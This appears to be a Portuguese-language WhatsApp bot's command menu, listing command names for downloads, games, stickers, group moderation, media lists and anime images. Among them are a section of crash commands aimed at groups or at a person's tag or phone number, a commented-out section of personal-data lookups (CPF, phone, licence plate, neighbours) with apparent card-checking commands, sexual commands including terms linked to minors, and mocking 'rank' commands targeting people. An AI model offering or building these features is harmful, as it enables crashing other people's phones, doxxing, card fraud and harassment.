║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Menuadms
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Menudono
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Listaapps
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Listajogos
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Listaseries
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Listafilmes
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Menuanime
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Menuhentai
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Alteradores
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Menuprem
║
╠┄┄┄⟨👻𝐈𝐍𝐅𝐎/𝐃𝐎𝐍𝐎👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Fotomenu (MARCAR-IMG) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}audio-menu
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}verificado-global
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}console
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}botoes
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}InfoBemvindo
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Infopalavrão
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Infolistanegra
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Infobancarac
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Infovotação
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Infocontador
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Infosorteio
║
╠┄┄┄⟨👻𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Play (NOME) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Playmp4 (NOME) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Ytsearch (NOME) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Ytmp4 (LINK) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Ytmp3 (LINK) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Tiktok (LINK) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Instagram (LINK) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Facebook (LINK) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Twitter (LINK) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Imgpralink (MARCAR)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Videopralink (MARCAR-V) 
║
╠┄┄┄⟨👻𝐉 𝐎 𝐆 𝐎 𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}eununca
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Ppt (PEDRA/PAPEL/TESOURA) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Jogodavelha (@MARCAR) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Ttt (JOGO-DA-VELHA) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Cassino
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Quizanimais 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Anagrama 1 / 0
║
╠┄┄┄⟨👻𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Attp (TEXTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Attp2 (TEXTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Attp3 (TEXTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Attp4 (TEXTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Attp5 (TEXTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Attp6 (TEXTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Attp7 (TEXTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Attp8 (TEXTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Attp9 (TEXTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Attp10 (TEXTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Ttp (TEXTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Fsticker (MARCAR-FOTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Sticker (MARCAR-FOTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Toimg (MARCAR-FIGU)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Togif (MARCAR-FIGU)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Roubar (TEXT/TEXT)
║
╠┄┄┄⟨👻𝐂𝐌𝐃𝐒/𝐁𝐀𝐒𝐈𝐂𝐎𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Gtts (LINGUAGEM + TEXTO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Traduzir Hello 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Tagme 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Emoji
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Emojimix
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Tabela (LETRAS) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Conselhobiblico
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Google 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Printsite
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}clima (SUA CIDADE)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}clima2 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}mercadolivre
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}ia (FAÇA UMA PERGUNTA)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Simi (FALE-ALGO)  
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Perfil
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Calcular (1 + 1)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Fazernick (NICK)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Bot
║
╠┄┄┄⟨👻𝐌𝐄𝐍𝐔 𝐀𝐃𝐌👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Kick [@] (pra-remover) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Ban (responder-mensagem)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Promover [@] (Ser-ADM)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Rebaixar [@] (rebaixar-adm)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Totag (menciona-algo)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Grupo f/a
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Status
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Limpar (texto-invisível-gp)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Atividades (DO-GRUPO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Linkgp
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Grupoinfo
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Hidetag (txt) (marcação)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Marcar (marca tds do gp)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Marcar2 (Marca-tds-Wa.me/)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Anagrama 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Autofigu 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Antidocumento 1 / 0  
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Antipalavra 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Antiloc 1 / 0  
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Anticontato 1 / 0  
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Antilink 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Antilinkhard 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}AntiCatalogo 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Antifake 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Bemvindo 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Antiimg 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Antiaudio 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Antivideo 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Leveling 1 / 0  
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Simih 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Simih2 1 / 0
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Descgp (TXT)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Nomegp (Nome)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Criartabela (ESCREVA-ALGO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Tabelagp
║
╠┄┄┄⟨👻𝐀𝐋𝐓𝐄𝐑𝐀𝐃𝐎𝐑𝐄𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Videolento (marca)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Videorapido (marca)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Videocontrario (marca)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Audiolento (marca)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Audiorapido (marca)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Grave (marca)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Grave2 (marca)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Esquilo (marca)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Estourar (marca)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Bass (marca)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Bass2 (marca)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Vozmenino (marca)
║
╠┄┄┄⟨👻𝐇 𝐄 𝐍 𝐓 𝐀 𝐈 𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}foot
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}gangbang
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jahy
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}glasses
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}masturbation
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}cuckold
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}ero
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}cum
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}femdom
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}masturbation
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}femdom
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}ahegao
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}bdsm
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}blowjob
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}pussy
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}nsfwneko
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}tentacles
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}thinghs
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}yuri
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}zettairyouiki
║
╠┄┄┄⟨👻𝐀 𝐏 𝐏 𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}app1
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}app2
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}app3
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}aap4
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}app5
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}app6
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}app7
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}app8 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}app9
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}app10
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}app11
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}app12
║
╠┄┄┄⟨👻𝐉 𝐎 𝐆 𝐎 𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo1
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo2
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo3
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo4
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo5
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo6
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo7
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo8
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo9
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo10
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo11
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo12
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo13
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo14
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo15
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo16
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo17
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo18
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo19
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo20
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo21
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo22
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo23
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo24
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo25
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo26
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo27
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo28
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo29
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jogo30
╠┄┄┄⟨👻𝐀 𝐍 𝐈 𝐌 𝐄 𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}shota
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}waifu
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}loli2
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}yotsuba
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}shinomiya
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}yumeko
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}tejina
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}chiho
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}boruto
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}kaori
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}shizuka
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}kaga
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}kotori
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}mikasa
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}akiyama
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}gremory
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}isuzu
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}shina
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}kagura
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}shinka
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}eba
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}elaina
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}erza
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}hinata
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}minato
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}naruto
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}sagiri
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}nezuko
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}rize
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}deidara
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}yuki
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}ana
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}asuna
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}ayuzawa
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}chitoge
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}emilia
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}hestia
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}inori
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}itachi
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}madara
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}sakura
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}sasuke
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}tsunade
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}onepiece
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}mobil
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}montor
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}keneki
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}megumin
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}toukachan
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}itori
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}kurumi
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}sakurajima
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}miku
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}pokemon
║
╠┄┄┄⟨👻𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}cyberspace
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}gamer
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}satanic
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}wallpaperanime
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}aesthetic
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}ppcouple
║
╠┄┄┄⟨👻𝐒 𝐄 𝐑 𝐈 𝐄 𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie1
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie2
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie3
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie4
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie5
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie6
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie7
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie8
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie9
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie10
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie11
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie12
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie13
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie14
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie15
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie16
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie17
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie18
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie19
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie20
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie21
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie22
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie23
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie24
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie25
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie26
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie27
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie28
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie29
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie30
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie31
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie32
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie33
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie34
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie35
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie36
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie37
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie38
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie39
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie40
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie41
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie42
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}serie43
║
╠┄┄┄⟨👻𝐄 𝐃 𝐈 𝐓 𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}hunteredits
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}spyxfamilyedits
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}narutoedits
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}onepieceedits
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}nanatsuedits
╠┄┄┄⟨👻𝐅 𝐈 𝐋 𝐌 𝐄 𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme1
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme2
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme3
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme4
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme5
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme6
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme7
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme8
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme9
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme10
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme11
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme12
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme13
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme14
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme15
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme16
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme17
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme18
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme19
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme20
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme21
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme22
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme23
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme24
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme25
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme26
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme27
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme28
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme29
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme30
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme31
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme32
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme33
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme34
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme35
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme36
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme37
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme38
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme39
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme40
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme41
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme42
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme43
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme44
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme45
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme46
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme47
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme48
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme49
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme50
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme51
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme52
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme53
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme54
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}filme55
║
/*╠┄┄┄⟨👻𝐏𝐔𝐗𝐀𝐃𝐀𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}tel
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}tel2
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}tel3
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}cpf
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}cpf2
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}cpf3
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}cpf4
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}nome
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}placa
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}bin
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}store
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}vizinhos
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}chk
*/╠┄┄┄⟨👻𝐓𝐑𝐀𝐕𝐀𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}crashcarrinho
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}crashaudiobug
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}crashconvite
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}crashliveloc
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}matargp
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}travacrash [@ ou numero sem + e sem espaço]
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}crashwebpag
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}crashloc
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}crashfig
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}crashcatalogo
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}crashpythonbug 
║
╠┄┄┄⟨👻𝐁𝐑𝐈𝐍𝐂𝐀𝐃𝐄𝐈𝐑𝐀𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Gay (marca (@))
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Feio (marca (@))
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Corno (marca (@))
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Vesgo (marca (@))
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Bebado (marca (@))
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Gostoso (marca (@))
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Gostosa (marca (@))
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Beijo (marca (@))
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Matar (marca (@))
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Tapa (marca (@))
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Chute (marca (@))
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Dogolpe (marca (@))   
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Nazista (marca (@))
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Chance (fale algo) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Casal   
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Rankgay     
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Rankgado
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Rankcorno  
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Rankgostoso
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Rankgostosa
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Ranknazista
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Rankotakus
